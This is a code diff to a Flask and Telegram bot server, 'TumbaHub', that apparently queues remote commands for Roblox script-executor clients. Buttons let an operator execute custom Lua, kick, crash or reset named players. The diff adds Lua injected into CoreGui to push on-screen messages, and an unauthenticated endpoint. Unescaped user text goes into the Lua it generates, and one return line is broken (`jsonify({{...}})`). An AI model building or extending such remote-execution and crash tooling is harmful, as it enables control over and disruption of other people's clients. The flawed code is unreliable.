@@ -85,12 +85,26 @@ def answer_callback(callback_id, text=None, show_alert=False):
 # Загружаем базу при старте сервера!
 commands_queue = load_players_from_github()
 awaiting_reason = {}
+awaiting_msg_text = {}
+awaiting_msg_duration = {}
 awaiting_execute = {}
 last_seen = {}
 
 @app.route('/')
 def home():
     return "TumbaHub Server is running!"
+
+@app.route('/api/send_message', methods=['POST'])
+def send_message_from_client():
+    data = request.json
+    if not data or 'text' not in data:
+        return jsonify({"status": "error", "message": "No text provided"}), 400
+    
+    client_message = data.get('text')
+    # Просто пересылаем текст в основной чат
+    send_telegram_message(TELEGRAM_CHAT_ID, f"🤖 **Сообщение от клиента:**\n\n{client_message}", parse_mode="Markdown")
+    
+    return jsonify({"status": "success"})
 
 @app.route('/api/log_user', methods=['POST'])
 def log_user():
@@ -163,6 +177,46 @@ def telegram_webhook():
                     ]
                 }
                 send_telegram_message(TELEGRAM_CHAT_ID, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
+                return jsonify({"status": "ok"})
+
+            # НОВОЕ: Если бот ждет длительность сообщения
+            if chat_id in awaiting_msg_duration:
+                try:
+                    duration = int(text)
+                    data = awaiting_msg_duration.pop(chat_id)
+                    target_user = data["user"]
+                    msg_text = data["text"]
+
+                    # Генерируем Lua-код для ScreenGui
+                    lua_code = f"""
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.DisplayOrder = 999
+local label = Instance.new("TextLabel", gui)
+label.Size = UDim2.new(1, -40, 0, 100)
+label.Position = UDim2.new(0.5, 0, 0, 20)
+label.AnchorPoint = Vector2.new(0.5, 0)
+label.BackgroundTransparency = 0.5
+label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.Font = Enum.Font.SourceSansBold
+label.TextSize = 24
+label.TextWrapped = true
+label.Text = "{msg_text}"
+game:GetService("Debris"):AddItem(gui, {duration})
+"""
+                    action = f"/execute__{lua_code}"
+                    if target_user not in commands_queue: commands_queue[target_user] = []
+                    commands_queue[target_user].append(action)
+                    send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Сообщение '{msg_text}' на {duration} сек. отправлено игроку {target_user}!")
+                except ValueError:
+                    send_telegram_message(TELEGRAM_CHAT_ID, "⚠️ Ошибка: Введите число. Попробуйте снова.")
+                return jsonify({{"status": "ok"}})
+
+            # НОВОЕ: Если бот ждет текст сообщения
+            if chat_id in awaiting_msg_text:
+                target_user = awaiting_msg_text.pop(chat_id)
+                awaiting_msg_duration[chat_id] = {"user": target_user, "text": text}
+                send_telegram_message(TELEGRAM_CHAT_ID, f"💬 Сообщение: '{text}'.\n\nТеперь отправь длительность сообщения в секундах (например, 10).")
                 return jsonify({"status": "ok"})
 
             # 2. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
@@ -264,9 +318,11 @@ def telegram_webhook():
                     # Собираем меню профиля игрока
                     keyboard = {
                         "inline_keyboard": [
+                            [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
                             [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}],
                             [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
-                            [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}], # <--- НОВАЯ КНОПКА
+                            [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
+                            [{"text": "✅ Check Status", "callback_data": f"checkstatus_{target_user}"}],
                             [{"text": "🔙 Назад к списку", "callback_data": "menu_players"}]
                         ]
                     }
@@ -280,11 +336,27 @@ def telegram_webhook():
                         }
                     )
                 
+                # --- ОТПРАВКА СООБЩЕНИЯ ---
+                elif btn_action == "message":
+                    awaiting_msg_text[chat_id] = target_user
+                    # Очищаем другие состояния
+                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
+                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
+                    
+                    send_telegram_message(TELEGRAM_CHAT_ID, f"✍️ Отправь мне текст сообщения для игрока **{target_user}**:", parse_mode="Markdown")
+
+                # --- ПРОВЕРКА СТАТУСА ---
+                elif btn_action == "checkstatus":
+                    action = "/check_status"
+                    if target_user not in commands_queue: commands_queue[target_user] = []
+                    commands_queue[target_user].append(action)
+                    answer_callback(callback_id, text=f"✅ Запрос статуса отправлен {target_user}.")
+
                 # --- ВЫПОЛНЕНИЕ СКРИПТА ---
                 elif btn_action == "execselect":
                     awaiting_execute[chat_id] = target_user
-                    # Если нажали другую кнопку, очищаем конфликт состояний
-                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
+                    if chat_id in awaiting_reason: del awaiting_reason[chat_id] # Очищаем конфликт состояний
+                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
                     
                     requests.post(
                         f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
@@ -295,6 +367,7 @@ def telegram_webhook():
                 elif btn_action == "kick":
                     awaiting_reason[chat_id] = target_user
                     if chat_id in awaiting_execute: del awaiting_execute[chat_id]
+                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
                     
                     keyboard = {"inline_keyboard": [[{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}]]}
                     requests.post(
